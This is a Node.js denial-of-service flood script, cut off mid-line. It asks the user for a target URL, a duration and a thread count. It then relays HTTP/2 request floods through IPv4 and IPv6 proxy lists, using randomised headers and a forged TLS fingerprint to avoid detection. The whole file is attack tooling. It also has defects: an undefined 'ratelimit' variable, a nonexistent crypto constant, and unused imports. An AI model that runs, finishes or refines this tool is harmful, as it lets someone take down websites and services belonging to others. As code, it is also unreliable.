const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const http2 = require('http2-wrapper');
const crypto = require('crypto');
const { exec } = require('child_process');
const HPACK = require('hpack');

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.on('uncaughtException', (e) => console.log(e));
process.on('unhandledRejection', (e) => console.log(e));

const proxyfile_ipv4 = 'proxies_ipv4.txt';
const proxyfile_ipv6 = 'proxies_ipv6.txt';

const askForTarget = () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    readline.question('Enter the target URL: ', (target) => {
        readline.question('Enter the attack duration in seconds: ', (time) => {
            readline.question('Enter the number of attack threads: ', (threads) => {
                readline.close();
                startAttack(target, parseInt(time), parseInt(threads));
            });
        });
    });
};

const startAttack = (target, time, threads) => {
    const url = new URL(target);
    const proxies_ipv4 = fs.readFileSync(proxyfile_ipv4, 'utf-8').toString().replace(/\r/g, '').split('\n');
    const proxies_ipv6 = fs.readFileSync(proxyfile_ipv6, 'utf-8').toString().replace(/\r/g, '').split('\n');

    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36',
    ];

    const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
    const getRandomChar = () => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
    const generateRandomString = (length) => Array.from({ length }, () => getRandomChar()).join('');

    const randomizeHeaders = () => {
        return {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": getRandomUserAgent(),
            [`Header-${getRandomChar()}`]: generateRandomString(10)
        };
    };

    const performHttpAttack = async (proxyHost, proxyPort, agent, url, settings, sessionOptions, headers, method, postData = null) => {
        const request = http.get({
            method: 'CONNECT',
            host: proxyHost,
            port: proxyPort,
            agent,
            path: `${url.host}:443`,
            headers: { 'Proxy-Connection': 'Keep-Alive' },
            rejectUnauthorized: true,
        });

        request.on('error', request.destroy);

        request.on('connect', (res, socket, { head }) => {
            if (head?.length) return socket.destroy();

            const session = http2.connect(`https://${url.host}`, {
                ...sessionOptions,
                createConnection: (authority, option) => tls.connect({
                    ...option,
                    socket,
                    ALPNProtocols: ['h2'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    session: crypto.randomBytes(64),
                    secure: true,
                    rejectUnauthorized: false
                }),
            });

            session.on('error', () => session.destroy());

            session.on('connect', () => {
                Array.from({ length: ratelimit }).forEach((_, index) => {
                    const reqHeaders = { ...headers, ':method': method, ':path': url.pathname };
                    if (method === 'POST') {
                        reqHeaders['Content-Length'] = postData.length;
                    }

                    const req = session.request(reqHeaders);
                    req.setEncoding('utf8');
                    req.on('response', (headers, flags) => {
                        console.log('Status Code:', headers[':status']);
                    });
                    req.on('end', () => req.destroy());
                    req.on('error', (err) => console.error('Request Error:', err));
                    req.end(postData);
                });
            });
        });

        request.end();
    };

    const TCP_CHANGES_SERVER = () => {
        const congestionControlOptions = ['cub